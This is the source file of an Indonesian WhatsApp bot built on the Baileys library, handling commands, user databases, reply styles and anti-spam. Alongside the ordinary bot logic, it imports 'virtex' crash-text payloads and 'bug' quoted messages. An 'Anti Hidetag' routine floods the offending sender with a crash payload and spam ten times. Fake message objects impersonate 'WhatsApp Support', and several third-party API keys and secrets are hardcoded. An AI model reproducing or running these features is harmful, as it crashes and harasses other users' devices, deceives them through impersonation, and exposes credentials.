
"use strict";
const { 
WAMessageStubType, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, downloadContentFromMessage, downloadHistory, proto, getMessage, generateWAMessageContent, prepareWAMessageMedia , generateWAMessage, areJidsSameUser,downloadMediaMessage, makeInMemoryStore
} = require("@adiwajshing/baileys")
const toMs = require('ms')
const chalk = require('chalk')
const fs = require("fs")
const fse = require('fs-extra');
const ra = require("ra-api");
const moment = require("moment-timezone");
const util = require("util");
const { exec, spawn } = require("child_process");
const ffmpeg = require("fluent-ffmpeg");
const axios = require("axios");
const hxz = require("hxz-api");
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
const yts = require("yt-search");
const speed = require("performance-now");
const request = require("request");
const ms = require("parse-ms");
const ytdl = require('ytdl-core');
const os = require('os');
const PhoneNumber = require('awesome-phonenumber')
//SENDKONTAK
const sendKontak = (from, nomor, nama, org = "") => {
const vcard ="BEGIN:VCARD\n" +"VERSION:3.0\n" + "FN:" +nama +"\n" +"ORG:" + org + "\n" +"TEL;type=CELL;type=VOICE;waid=" +nomor + ":+" +nomor +"\n" +"END:VCARD";
xdev.sendMessage(from, { displayname: nama, vcard: vcard }, MessageType.contact,{ quoted: dev });
};
const { performance } = require('perf_hooks')
const imageToBase64 = require('image-to-base64');
const fetch = require('node-fetch');
const acrcloud = require("acrcloud");
const acr = new acrcloud({
host: "identify-eu-west-1.acrcloud.com",
access_key: "c9f2fca5e16a7986b0a6c8ff70ed0a06",
access_secret: "PQR9E04ZD60wQPgTSRRqwkBFIWEZldj0G3q7NJuR"
});
const Download = require("@phaticusthiccy/open-apis");
const { SoundCloud } = require("scdl-core");
const CuteFFMPEG = require("cute-ffmpeg").CuteFFMPEG;
const FFMPEGRequest = require("cute-ffmpeg").FFMPEGRequest;
const Ffmpeg = new CuteFFMPEG({
overwrite: true
});
const Spotify = require('spotifydl-core').default
const spotify = new Spotify({
clientId: 'acc6302297e040aeb6e4ac1fbdfd62c3',
clientSecret: '0e8439a1280a43aba9a5bc0a16f3f009'
}) 
const { sizeFormatter } = require('human-readable')
const hx = require("hxz-api")
const convert = require('imagemagick')
const gis = require('g-i-s');
const {
instagramdl, 
instagramdlv2,
instagramStory,
instagramStoryv2,
youtubeSearch,
mediafiredl, 
lyricsv2, 
lyrics, 
facebookdl, 
facebookdlv2,
tiktokdl, 
tiktokdlv2,
tiktokdlv3,
tiktokdlv4,
twitterdl, 
twitterdlv2,
getZodiac,
liputan6,
googleIt, 
wallpaperv2, 
googleImage, 
jadwalTVNow, 
gempa, 
stickerTelegram,
stickerLine,
latinToAksara,
aksaraToLatin,
asmaulhusna, asmaulhusnajson,
alquran,delay,
jadwalsholat, listJadwalSholat,
gempaNow} = require('@bochilteam/scraper')
const { 
instagramdlv3} = require('@bochilteam/scraper')
const text2png = require("text2png")
const ameClient = require("amethyste-api")
const ameApi = new ameClient("1f486b04b157f12adf0b1fe0bd83c92a28ce768683871d2a390e25614150d0c8fa404fd01b82a5ebf5b82cbfa22e365e611c8501225a93d5d1e87f9f420eb91b")
const { BitlyClient } = require('bitly');
const bitly = new BitlyClient('7d737131e678fc366699edead8bca146e69f6c78', {});
const stringSimilarity = require("string-similarity");



//----------------- LIB FILE ------------------\\
const { msgFilter, addSpam, unSpam, SpamExpired, cekSpam} = require('../lib/antispam')
const { jadibot, stopjadibot, listjadibot } = require('../lib/jadibot.js')
const { color, bgcolor } = require('../lib/color')
//const { webp2mp4File } = require("../lib/converter")
const { pinterest } = require("../lib/pinterest")
const {formatp, getCase, kyun, isUrl, fetchJson, fetchText, getGroupAdmins, sleep,getBuffer} = require("../lib/myfunc");
const {parseMention, FileSize, weton,week,calender,dateIslamic,formatDate, makeid, generateMessageTag, runtime, randomNomor, jsonformat, generateProfilePicture, h2k, generateMessageID, getRandom} = require('../lib/functions')
const {TelegraPh} = require('../lib/uploader')
const { ghstalk,facebook, kodepos, moddroid, apkmody, happymod, wallpaper, wikimedia, quotesAnime, aiovideodl  } = require('../lib/scraper') 
const { addblockcmd, deleteblockcmd, checkblockcmd } = require("../lib/blockcmd");
const { clearAllBan, addBanned, unBanned, cekBannedUser } = require("../lib/banned")
const { addError,clearAllError, deleteError, checkError } = require("../lib/totalerror")
const {getDateId,clearAllUser, resetLevelingXp, userXp, userLeveling, getLevelingXp, getLevelingLevel, getLevelingId, addLevelingXp, addLevelingLevel, addUserId } = require("../lib/user");
const { gethitUser, checkHit, AddHit, isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit, tesKurang, getTes, giveTes } = require("../lib/user");
const { Nothing,Failed,Succes,addAutoClear,autoClearChat,checkAutoClear, checkDataName, createDataId, getDataId, addDataId, removeDataId, checkDataId, checkClaim, getClaim, expiredClaim, addUserClaim, getHit, cmdAdd, expiredCmd } = require("../lib/totalcmd");
const _sewa = require('../lib/sewa')
const _prem = require("../lib/premium");
const { addBlock, unBlock, cekBlock } = require("../lib/blockuser");
const { _scommand } = require("./jsonfile.js");
const { addInventoriDarah, cekDuluJoinAdaApaKagaDiJson, addDarah, kurangDarah, getDarah } = require('../lib/darah.js')
const { cekInventoryAdaAtauGak, addInventori, addBesi, addEmas, addEmerald, addUmpan, addPotion, kurangBesi, kurangEmas, kurangEmerald, kurangUmpan, kurangPotion, getBesi, getEmas, getEmerald, getUmpan, getPotion } = require('../lib/alat_tukar.js')
const { addInventoriMonay, cekDuluJoinAdaApaKagaMonaynyaDiJson, addMonay, kurangMonay, getMonay } = require('../lib/monay.js')
const { cekDuluHasilBuruanNya, addInventoriBuruan, addIkan, addAyam, addKelinci, addDomba, addSapi, addGajah, kurangIkan, kurangAyam, kurangKelinci, kurangDomba, kurangSapi, kurangGajah, getIkan, getAyam, getKelinci, getDomba, getSapi, getGajah } = require('../lib/buruan.js')  

// Exif
const Exif = require("../lib/exif")
const exif = new Exif()

//================================================================================\\
const _tebakkabupaten = JSON.parse(fs.readFileSync('./database/game/tebakkabupaten.json'))
const { tebakkimia, asahotak, susunkata, tebakkalimat, tekateki, caklontong, tebakbendera, tebakanime, tebakkabupaten, tebaklagu, tebaklirik } = require('../lib/index.js')
const sendvn = (teks) => {
xdev.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
}
const { ucapsalamikum, enggakmau, ucapmalam, ucapsiang, ucappagi, botz, unregister, ucaphai, toxicbro, spamnih, loplop } = require("../message/vn")
//Vn saat command tidak ditemukan
const unreg = unregister[Math.floor(Math.random() * unregister.length)]              
const gakada = fs.readFileSync(unreg)

//VN saat ada yang toxic
const anying = toxicbro[Math.floor(Math.random() * toxicbro.length)]              
const astaga = fs.readFileSync(anying)

//VN saat ada yg akses fitur owner
const ahenggak = enggakmau[Math.floor(Math.random() * enggakmau.length)]              
const gakmau = fs.readFileSync(ahenggak)

//VN saat ada yg bilang selamat pagi
const ay = ucappagi[Math.floor(Math.random() * ucappagi.length)]
const oahyo = fs.readFileSync(ay)

//VN saat ada yg bilang selamat malam
const ayuk = ucapmalam[Math.floor(Math.random() * ucapmalam.length)]
const oyasumi = fs.readFileSync(ayuk)

//VN saat ada yg bilang selamat siang
const yayuk = ucapsiang[Math.floor(Math.random() * ucapsiang.length)]
const koniciwa = fs.readFileSync(yayuk)

//VN saat ada yg spam
const alal = spamnih[Math.floor(Math.random() * spamnih.length)]
const nospam = fs.readFileSync(alal)

//VN saat ada yg bilang halo
const ulul = ucaphai[Math.floor(Math.random() * ucaphai.length)]
const moshimos = fs.readFileSync(ulul)

//VN saat ada yg bilang asalamualaikum
const alul = ucapsalamikum[Math.floor(Math.random() * ucapsalamikum.length)]
const walaikumsalam = fs.readFileSync(alul)

//VN saat ada yg bilang i love u
const awlu = loplop[Math.floor(Math.random() * loplop.length)]
const lopyoutoo = fs.readFileSync(awlu) 

//===============================================================\\
const getCmd = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return _scommand[position].chats
    }
}
const getCommandPosition = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}
const checkSCommand = (id) => {
    let status = false
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            status = true
        }
    })
    return status
}





// Database
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    _scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
}
const AntiSpam = JSON.parse(fs.readFileSync('./database/antispam.json'));
const DataId = JSON.parse(fs.readFileSync('./database/data.json'))
const listcmdblock = JSON.parse(fs.readFileSync('./database/blockcmd.json'))
const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
const listerror = JSON.parse(fs.readFileSync('./database/listerror.json'))
const virgam = fs.readFileSync('./stik/virgam.jpeg'),
 davizin = fs.readFileSync('./stik/davizinmaker.jpg'),
 girl = fs.readFileSync('./stik/trava.jpg'),
 thumb = fs.readFileSync('./stik/thumb.jpeg'),
 fakethumbnail = fs.readFileSync('./stik/fake.jpeg');
const setiker = JSON.parse(fs.readFileSync('./temp/stick.json'))
const audionye = JSON.parse(fs.readFileSync('./temp/vn.json'))
const user = JSON.parse(fs.readFileSync('./database/user.json'))
const hitnya = JSON.parse(fs.readFileSync('./database/hitToday.json'))
const premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const _claim = JSON.parse(fs.readFileSync('./database/claim.json'))
const blocked = JSON.parse(fs.readFileSync('./database/userblocked.json'))
const dash = JSON.parse(fs.readFileSync('./database/dashboard.json'))
const anonChat = JSON.parse(fs.readFileSync('./database/anonymous.json'))
const allcommand = JSON.parse(fs.readFileSync('./database/allcommand.json'));
const sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
const spammer = []
const { ilhamberkata } = require("../message/message.js")
//------------------ VIRTEX FILE ------------------\\
//virtex by tsukasa

const { virtex, virtag, philip, emoji1, emoji2, virtex2, virtex3, virtex4, virtex5, virtex8, virtex9, virtex10, virtex11, virtex12, slayer, ngazap, virtexbytsukasa } = require('../virtex/virtex.js')
const { virtex6 } = require('../virtex/virtex6.js')
const { virtex7 } = require('../virtex/virtex7.js')
const { ngazapv1 } = require('../virtex/ngazapv1')
const { ngazapv2 } = require('../virtex/ngazapv2')
const { ngazapv3 } = require('../virtex/ngazapv3')
const antivirus  = require('../virtex/antivirus.js')           
var publik = true
const jancok = ["bugkontak","bugquoted","bugfc","bugquoted","bugkontak","bugfc","bugkontak","bugfc","bugquoted","bugfc","bugquoted","bugkontak","bugfc","bugkontak","bugquoted"]
const QotedBug = jancok[Math.floor(Math.random() * jancok.length)]
const b2 = ["gebukin","santet"]
//=================================================//
module.exports = async(xdev, dev, chatUpdate, store) => {

const Araa = xdev
const m = dev
var Ownerin ="6285156137901@s.whatsapp.net"
var ownerNumber = [`${nomerOwner}@s.whatsapp.net` ,`${nomerOwner2}@s.whatsapp.net`,`6285156137901@s.whatsapp.net` ]
xdev.readMessages([dev.key])
 

try {

//console.log(nomerOwner)
const { type, now, fromMe } = dev
let { allmenu, fitur} = require('./help')
const Id =  dev.key.id
const antibot = dev.isBaileys
const content = JSON.stringify(dev.message)
const from  = dev.key.remoteJid
const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
const body = (type === 'conversation') ? dev.message.conversation : (type == 'imageMessage') ? dev.message.imageMessage.caption : (type == 'videoMessage') ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') ? dev.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? dev.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ? dev.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (dev.message.buttonsResponseMessage?.selectedButtonId || dev.message.listResponseMessage?.singleSelectReply.selectedRowId ) : ''
const pes = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : ''
const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
const messagesC = pes.slice(0).trim()


if (multi){
var prefix = /^[#+,.=''!¦|/\\©^]/.test(body) ? body.match(/^[#+,.=''!¦|/\\©^]/gi) : '.'
var thePrefix = "Multi Prefix"
}


const budy = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
const selectedButton = (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedButtonId : ''
const responseButton = (type == 'listResponseMessage') ? dev.message.listResponseMessage.title : ''                        
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const isCmd = body.startsWith(prefix)
const q = args.join(' ')
const c = args.join(" ")
const timeWib = moment().tz('Asia/Jakarta').format('HH:mm:ss')
const timeWit= moment().tz('Asia/Makassar').format('HH:mm:ss')
const timeWita = moment().tz('Asia/Jayapura').format('HH:mm:ss')
const botNumber = xdev.user.id ? xdev.user.id.split(":")[0]+"@s.whatsapp.net" : xdev.user.id
const isGroup = from.endsWith('@g.us')
const sender = isGroup ? (dev.key.participant ? dev.key.participant : dev.participant) : dev.key.remoteJid
const senderNumber = sender.split("@")[0] 
const isOwner = ownerNumber.includes(sender) || checkDataId ("owner", sender, DataId) 
const theOwner = sender == Ownerin
const totalchat = await store.chats.all().map(v => v.id)
const totalGroup = totalchat.filter(v => v.endsWith('g.us'))
const groupMetadata = isGroup ? await xdev.groupMetadata(from) : ""
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.jid : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupDesc = isGroup ? groupMetadata.desc : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
const pushname = dev.pushName || "No Name"
const chatss = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''
const forward = {forwardingScore: 10, isForwarded: true, sendEphemeral: true}
const text = args.join(" ")
const timestampp = speed();
const latensi = speed() - timestampp
const arg = budy.slice(command.length + 2, budy.length)
const itsMe = sender == botNumber ? true : false
const mentionByTag = type == "extendedTextMessage" && dev.message.extendedTextMessage.contextInfo != null ? dev.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && dev.message.extendedTextMessage.contextInfo != null ? dev.message.extendedTextMessage.contextInfo.participant || "" : ""
const quoted = dev.quoted ? dev.quoted : dev
const mime = (quoted.msg || quoted).mimetype || ''
const users = mentionByReply? mentionByReply : mentionByTag[0]
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []
const isHit = checkHit(senderNumber, user)   
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001) 
const numberQuery = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
const numberQueryV2 = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
  
const Input = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
const delay = time => new Promise(res => setTimeout(res, time))


  
//Bot hanya merespon jika button miliknya saja yang di tekan 
if(isGroup && type == 'buttonsResponseMessage' && dev.message.buttonsResponseMessage.contextInfo.participant !== botNumber || isGroup && type == 'templateButtonReplyMessage' && dev.message.templateButtonReplyMessage.contextInfo.participant !== botNumber){return}

//Bot akan merespon jika di reply + command
const replyCommand = isCmd? isCmd : allcommand.includes(toFirstCase(command))
//if(isGroup && mentionByReply && mentionByReply !== botNumber && replyCommand) {return}
  
//User 
const userLevel = getLevelingLevel(senderNumber, user)
const userExp = getLevelingXp(senderNumber, user)
const userId = getLevelingId(senderNumber, user)
const amountExp = Math.floor(Math.random() * 10) + 50
const requiredExp = 1000 * userLevel
const userPersen = userExp/requiredExp*100
const userVerified = getDateId(senderNumber, user) 
//---------Global Data----------\\

require("../message.js")(senderNumber, prefix,command)
//================================================================================\\
const DarahAwal = rpg.darahawal
const isDarah = cekDuluJoinAdaApaKagaDiJson(senderNumber)   
const isCekDarah = getDarah(senderNumber)
const isUmpan = getUmpan(senderNumber)
const isPotion = getPotion(senderNumber)
const isIkan = getIkan(senderNumber)
const isAyam = getAyam(senderNumber)
const iskelinci = getKelinci(senderNumber)
const isDomba = getDomba(senderNumber)
const isSapi = getSapi(senderNumber)
const isGajah = getGajah(senderNumber)
const isMonay = getMonay(senderNumber)
const isBesi = getBesi(senderNumber) 
const isEmas = getEmas(senderNumber)
const isEmerald = getEmerald(senderNumber)
const isInventory = cekInventoryAdaAtauGak(senderNumber)
const isInventoriBuruan = cekDuluHasilBuruanNya(senderNumber)
const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(senderNumber)
const ikan = ['🐟','🐠','🐡']
//================================================================================\\




  
//Security / Keamanan
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupOwner = isGroup ? groupOwner == sender : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAntiLink = checkDataId ("antilink", from, DataId) 
const isKickarea = checkDataId ("antiasing", from, DataId) 
const isAntilinkGc = checkDataId ("antilinkgc", from, DataId) 
const isBanchat = checkDataId ("banchat", from, DataId) 
const isAntiVirtex = checkDataId ("antivirtex", from, DataId)
const isAntihidetag = checkDataId ("antihidetag", from, DataId) 
const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)

const gcount = isPremium ? gcounti.prem : gcounti.user
// Presence Online
if (isCmd){
xdev.sendPresenceUpdate('composing', from)
} else {
xdev.sendPresenceUpdate('available', from)
}


//Bot akan merespon jika di reply + command
//if(isGroup && mentionByReply !== botNumber && (isCmd || allcommand.includes(command))) {return}

  
//Ucapan Waktu  
if(timeWib < "23:59:00"){ var ucapanWaktu = 'Selamat malam' }
if(timeWib < "19:00:00"){ var ucapanWaktu = 'Selamat malam'}
if(timeWib < "18:00:00"){ var ucapanWaktu = 'Selamat sore'}
if(timeWib < "15:00:00"){ var ucapanWaktu = 'Selamat siang'}
if(timeWib < "11:00:00"){ var ucapanWaktu = 'Selamat pagi'}
if(timeWib < "06:00:00"){ var ucapanWaktu = 'Selamat pagi'  }      
    
// image Pake Pp Org
try {
var ppimg = await xdev.profilePictureUrl(sender, 'image')
} catch (err) {

var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
const ofrply = await getBuffer(ppimg)    

//FAKE REPLY  
const ftoko = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync('./stik/reply.jpg')},"title": `${pushname}`,"description": `${ucapanWaktu} kak`,"currencyCode": "IDR", "priceAmount1000": `${pushname}`, "retailerId": `Rp10`,"productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const ftext = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/reply.jpg')}}}
const ftroli = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 200, status: 1,surface : 2,message: `${fake}\n${ucapanWaktu} kak`,orderTitle: `${ucapanWaktu} kak`,thumbnail: fs.readFileSync('./stik/reply.jpg'), sellerJid: `0@s.whatsapp.net`}}}
const floc = { key: {"fromMe": false,"participant": `0@s.whatsapp.net`, "remoteJid": "6289530863358-1621036495@g.us" },message: { "liveLocationMessage": { "title":`${fake}`,'jpegThumbnail': fs.readFileSync('./stik/reply.jpg')}}}
const fimage = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: {"imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": fake, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./stik/reply.jpg'), "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
const fdoc = { key : { participant : '0@s.whatsapp.net'}, message: { documentMessage: { title: 'Halo bang', jpegThumbnail: fs.readFileSync('./stik/reply.jpg')}}}
//bug kontak
const bugkontak = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=6288226703423:+62 882-2670-3423\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
const lep = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"contactMessage": {
"displayName": "WhatsApp Support",
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=6288226703423:+62 882-2670-3423\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"
}}}

  
//Set Quoted
if(Qoted === "ftoko"){
var setQuoted = ftoko
} else if(Qoted === "fkontak"){
var setQuoted = fkontak
} else if(Qoted === "ftext"){
var setQuoted = ftext
}else if(Qoted === "ftroli"){
var setQuoted = ftroli
} else if(Qoted === "floc"){
var setQuoted = floc
} else if(Qoted === "fimage"){
var setQuoted = fimage
} else if(Qoted === "dev"){
var setQuoted = dev
} else if(Qoted === "fdoc"){
var setQuoted = fdoc
}

  

 //SetReply
const setReply = async(result) =>{ 
if(language == "id"){
var teks = result
} else {
let translate = require('translate-google-api')
let tld = 'cn'
  let toks = await translate(result, {tld,to: language,})
var teks = toks[0]
}
	
if(replyType === "web2"){
xdev.sendMessageV2(from, { contextInfo: { externalAdReply:{ showAdAttribution: true, title: `hallo kak👋 ${pushname}`,body:`Runtime ${runtime(process.uptime())} `,previewType:"PHOTO",thumbnail: ofrply, sourceUrl:`https://chat.whatsapp.com/GdINqRys5GI62uhcuKon9v`}}, text: teks },{quoted: dev})
} else if(replyType === "web"){

xdev.sendMessage(from, { contextInfo: {   forwardingScore: 10, isForwarded: true, externalAdReply:{showAdAttribution: true, title: `hallo kak👋 ${pushname}`,body:`Runtime ${runtime(process.uptime())} `,previewType:"PHOTO",thumbnail: ofrply, sourceUrl:`https://chat.whatsapp.com/GdINqRys5GI62uhcuKon9v`}},showAdAttribution: true, text: teks }, { quoted: dev })
} else if(replyType === "mess"){
xdev.sendMessage(from, {text: teks}, { quoted: dev });
} else if(replyType === "quoted"){
xdev.sendMessage(from,{ text: teks}, { quoted: setQuoted });
} else if(replyType === "troli"){
let template = await generateWAMessageFromContent(from, {
'orderMessage': {
'orderId': '62887435047326@s.whatsapp.net',
'thumbnail': fs.readFileSync('./stik/reply.jpg'),
'itemCount': "2022",
'title': "title",
'description': "description",
'status': 1,
'surface': 1,
'message':teks,
'orderTitle': fake
}
}, {
'quoted': dev
});
 xdev.relayMessage(from, template.message,{ messageId: template.key.id })                   
} else if(replyType == "troli2"){
let template = await generateWAMessageFromContent(from, {
listMessage:  {
sections: [],
title: fake,
description: teks,
buttonText: '',
listType: 2,
productListInfo:  {
productSections: [
 {
 products: [
 { productId: '9999999999999999' },
 { productId: '6431678466857362' },
 { productId: '4392524570816732' },
 ],
title: 'junior'
}
],
headerImage:  {
productId: '4120139628109348',
jpegThumbnail:  fs.readFileSync('./stik/reply.jpg')
},
businessOwnerJid: '62887435047326@s.whatsapp.net'
}
}            
}, {
'quoted': dev
});
 xdev.relayMessage(from, template.message,{ messageId: template.key.id })                   
} else {
xdev.sendMessage(from, {text: "Error SetReply Tidak Di Temukan"})
}
}



//Button document ✓
const Sendbutdocument = async(id, text1, desc1, gam1, but = [], options = {}) => {	
const buttonMessage = {
contextInfo: options,
document: fs.readFileSync('./temp/file.docx'),
mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document", 
title : "Footer text", 
fileLength : 999999999999, 
pageCount: 100, 
fileName : "Extream", 
caption: text1,
footer: desc1,
buttons: but,
headerType: "DOCUMENT"
}

await xdev.sendMessage(id, buttonMessage,options)
} 
 


// Public & Self
if (!publik && !m.key.fromMe && !isOwner && !theOwner) return
 

// Bot Status
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
 })
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
		
		

		
		
		
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
const reply = (teks) => {
xdev.sendMessage(from, { text: teks }, { quoted: dev })
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ?  xdev.sendMessage(from, { text: teks, mentions: memberr, contextInfo: { "mentionedJid": memberr }}):  xdev.sendMessage(from, {mentions: memberr,text: teks, contextInfo: { "mentionedJid": memberr }},{quoted: dev})
}
const sendMess = (hehe, teks) => {
xdev.sendMessage(hehe, { text, teks })
}
const buttonWithText = (from, text, footer, buttons) => {
return xdev.sendMessage(from, { text: text, footer: footer, templateButtons: buttons })
}
const math = (teks) => {
return Math.floor(teks)
}  
const sendGif = (teks, teksnya) => {
xdev.sendMessage(from, { video: teks, caption: "Nih!",gifPlayback: true},{quoted: dev})
};        




//onlyOwner
  const onlyOwner = async() =>{
setReply(mess.only.ownerB)
}
const addSpammer = function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
_db[position].spam += 1
 } else {
let bulin = ({ id: jid, spam: 1 })
 _db.push(bulin)     
}
}

const FinisHim = async function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
if(_db[position].spam > 5){
let Name = await xdev.getName(jid+ `@s.whatsapp.net`)
if(cekBannedUser(jid, ban) && !isOwner){return}
addBanned(Name,calender,  jid, ban)          
console.log(`${jid} Terdeteksi spam lebih dari ${_db[position].spam} kali`)
setReply("Kamu telah di banned karena melakukan spam. chat owner untuk unban wa.me/+6285159088173")
}
} else {
console.log(`Spam ke ${_db[position].spam}`)
}
}

//Anti Hidetag
if(budy.startsWith(`${prefix}hidetag`) && isAntihidetag){
if(isGroupAdmins) await xdev.groupParticipantsUpdate(from, [sender], 'demote')
for (let i = 0; i < 10; i++) {
await xdev.sendKatalog(sender, virtex8(prefix), virtex8(prefix), thumb, {quoted: setQuoted})
let a = await xdev.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: dev.id } } })
await xdev.sendMessage(sender, { text: "awowkwkwk" }, { quoted: a });
await xdev.sendMessage(sender, { text: "awowkwkwk" }, { quoted: lep });
await sleep(1000)
}
}
  
//ANTI SPAM BERAKHIR
if(SpamExpired(senderNumber, "Case", AntiSpam)){
//removeObject(spammer,"id",senderNumber)
// spammer.splice(spammer.indexOf(idgc, 1))
console.log("Sukses remove spammer")
}
SpamExpired(senderNumber, "NotCase", AntiSpam)
if(cekBannedUser(senderNumber, ban) && !isOwner){return}
if(cekSpam("Case",senderNumber, AntiSpam)){
addSpammer(senderNumber, spammer)
FinisHim(senderNumber, spammer)
console.log("antispam Case aktif")
return
}


//ANTI SPAM PRIVATE CHAT
